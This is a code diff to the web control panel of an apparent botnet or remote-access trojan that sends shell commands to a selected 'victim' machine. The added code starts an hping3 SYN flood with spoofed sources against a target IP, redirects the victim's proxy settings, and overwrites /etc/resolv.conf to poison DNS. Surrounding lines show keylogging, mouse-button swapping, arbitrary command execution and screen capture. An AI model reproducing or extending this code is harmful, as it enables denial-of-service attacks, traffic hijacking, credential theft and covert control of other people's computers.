@@ -62,6 +62,44 @@
 
 
 
+    //flood
+
+    $("#botnetstart").on('click', function() { 
+        socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ' + $("#botnetip").val() }, function (data) {
+              alert("Started attack!");
+        });
+    });
+
+    $("#botnetstop").on('click', function() { 
+        socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'killall -9 hping3' }, function (data) {
+              alert("Stopped attack!");
+        });
+    });
+
+    //ff
+
+    $("#proxychange").on('click', function() { 
+          socket.emit('change_proxy', { toclient: $("#victim").val(), ip: $("#ffip").val(), port: $("#ffport").val() }, function (data) {
+              alert("Proxy changed!");
+          });
+      });
+
+
+    //resolv
+    $("#resolvedit").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'echo "' + $("#resolveditvalue").val() + '" > /etc/resolv.conf' }, function (data) {
+                alert("Resolv Cache modified!");
+          });
+      });
+
+    $("#resolvview").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'cat /etc/resol.conf' }, function (data) {
+              
+                $("#lg-op-body").html(data);
+                $("#lg-op").modal('show');
+          });
+      });
+
 
     //apps
      $("#viewapp").on('click', function() { 
@@ -108,7 +146,7 @@
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --kill' }, function (data) {});  
           alert("Keylogging stopped"); 
     });
-    
+    //annoy1
 
     $("#keypressinv").on('click', function() { 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 3 2 1"' }, function (data) {});   
@@ -117,7 +155,7 @@
     $("#keypressok").on('click', function() { 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 1 2 3"' }, function (data) {});   
     });
-
+//cmd
 
       $("#runcmd").on('click', function() { 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
@@ -127,7 +165,7 @@
           });
       });
 
-    
+    //screens
 
     $("#screen").on('click', function() { 
             var random = Math.floor(Math.random() * 1000000) + 1;
@@ -264,8 +302,8 @@
         <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
         
         <input id="botnetip" placeholder="IP address"></input>
-        <button id="botnet">Start Botnet Attack</button> 
-        <button id="botnet">Stop Botnet Attack</button><br/> <br/> 
+        <button id="botnetstart">Start Botnet Attack</button> 
+        <button id="botnetstop">Stop Botnet Attack</button><br/> <br/> 
     </div>
 
   </div>
@@ -297,9 +335,9 @@
         <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 
 
 
-        <input id="resolvedit" placeholder="Enter text.."></input>
-        <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 
+        <input id="resolveditvalue" placeholder="Enter text.."></input>
         <button id="resolvedit">Edit DNS Resolver Cache</button> <br/> <br/> 
+        <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 
 
     </div>
     <div class="col-sm-0" id="operations">    </div>
